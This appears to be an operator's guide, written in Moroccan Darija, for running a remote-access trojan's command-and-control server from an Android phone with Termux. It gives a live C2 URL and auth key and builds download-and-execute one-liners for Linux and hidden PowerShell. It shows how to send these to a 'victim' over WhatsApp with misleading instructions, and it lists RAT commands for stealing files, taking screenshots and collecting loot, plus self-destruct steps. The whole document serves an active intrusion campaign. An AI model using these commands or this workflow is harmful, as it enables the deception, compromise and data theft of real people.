# TERMUX.md — l'khdem mn Termux, step by step

Had l'file kayfser kifach tkhdem b l'C2 mn telifon Android b Termux ghir.
Ma khassk la laptop la SSH. Kol commande hna copy/paste.

## 1. Packages

    pkg update -y && pkg upgrade -y
    pkg install -y python curl termux-api termux-tools tmux
    termux-wake-lock

`termux-api` khass l `.audio` `.toast` `.vibrate` `.clip`. Zid mn Play Store
l'app **Termux:API** w 3tiha permissions (Micro, Notifications, Clipboard).

Ila baqi kat3ani mn l'kill f l'background: Android Settings → Apps → Termux
→ Battery → **Unrestricted**.

## 2. L'URL w l'key

Mn Railway dashboard: Settings → Networking → l'domaine.
Mn Variables: `AUTH`.

Khellihom f file bach ma t3awdch tktbhom:

    cat > ~/.c2 <<'EOF'
    URL=https://1uciferxyz.com/
    KEY=6553a3b73624003ba0ed5aa5a83a4f8c
    EOF
    chmod 600 ~/.c2
    source ~/.c2

Test:

    curl -fsS $URL/healthz
    # khass yji: ok

Ila ja 404 wla timeout: l'deploy tqte3, 3awd `railway up`.

## 3. L'links

### Automatique (l'ashel)

    curl -s -H "X-Auth: $KEY" $URL/link

Kay3tik l'joj one-liners wajdin. Copy l'wa7ed li bghit:

    curl -s -H "X-Auth: $KEY" $URL/link | grep '^linux' | cut -d' ' -f2- | termux-clipboard-set
    curl -s -H "X-Auth: $KEY" $URL/link | grep '^windows' | cut -d' ' -f2- | termux-clipboard-set

### B yeddek (nafs l'natija)

    echo "curl -fsSL $URL/i | sh" | termux-clipboard-set
    echo "powershell -w hidden -c \"irm $URL/i.ps1 | iex\"" | termux-clipboard-set

### L'panel kaydirha lik

7el l'panel → connect → bouton **links** → **copy**.

## 4. Sift l'lien l dda7ya

WhatsApp:

    termux-share -a send -c "text/plain" <(echo "curl -fsSL $URL/i | sh")

Wla ghir lsa9 mn l'clipboard. L'formes li kaytqblo:
- "7el Termux w 7et had l'commande" → l'`curl` link
- Windows: "7el PowerShell w 7et hada" → l'`irm` link
- Wla sift lih l'panel d l'files w goul lih yzid `| sh` (l'panel kaydirha rasso)

Ila l'dda7ya ma 3ndouch Termux: goul lih `pkg install python curl` 9bel.

## 5. L'panel f Termux

    termux-open-url "$URL/?k=$KEY"

Kayt7el f Chrome/Firefox. Men ba3d:
- 7et l'key f l'input → **connect**
- l'liste d l'sessions kat3mer; klik 3la wa7da
- l'input l'ta7t: kteb commande → Enter
- bla `.` = shell (`id`, `dir`, `ipconfig`)
- b `.` = commande d l'RAT (`.steal`, `.shot`, `.info`)
- bouton **links** = l'links wajdin
- l'asfal: loot → klik = téléchargement

Zid 3la home screen: Chrome → ⋮ → "Add to Home screen" (l'key katbqa f
l'URL, donc kayt7el nichan).

## 6. L'console (bdel l'panel)

    tmux new -s c2
    python3 ~/rat/console.py --url $URL --key $KEY

    ls            # sessions
    in a1b2       # dkhel
    .steal        # jme3 l'files
    .shot         # screenshot
    loot          # chouf chnou t7sad
    dl <fid>      # nzzel f ~/loot
    .leave        # fk
    q             # khrej

`Ctrl+B` w mn ba3d `D` = tmux kaybqa kaykhdem f l'background.
Rje3: `tmux a -t c2`.

## 7. Checklist dyal l'session

    [ ] pkg install python curl termux-api
    [ ] termux-wake-lock
    [ ] battery unrestricted
    [ ] curl -fsS $URL/healthz → ok
    [ ] l'lien tsift w l'dda7ya daret `| sh`
    [ ] l'session banat f `ls`
    [ ] .info katkhedem

## 8. Mora l'khedma

    .unpersist          # n7i l'persistence
    .sd                 # self-destruct (rasso + persistence)
    railway down        # w9ef l'serveur
    rm ~/.c2            # n7i l'secrets mn l'telifon

## 9. Chnou kaytle3 w chnou kaydir

| Error | Sabab | L'7ell |
|---|---|---|
| `healthz` 404 | deploy tqte3 / port ghalet | `railway up`, chouf Logs |
| `401` | key ghalta | 3awd `railway variables`, `source ~/.c2` |
| session ma katbanch | `python3` makaynch 3la l'dda7ya | goul lih `pkg install python` |
| session katgoul `-` | agent tqte3 > 90s | kayrje3 bouhdo f 30s |
| `nohup` kaymchi | Android kill | battery unrestricted + wake-lock |
| `termux-open-url` ma kaydirch walou | makaynch browser | `pkg install x11-repo` wla 7el Chrome b yeddek |
| `.audio` kayrje3 `no audio backend` | Termux:API makaynch | `pkg install termux-api` + app |
| loot kaytle9 | restart d Railway | state f mémoire; zid SQLite |
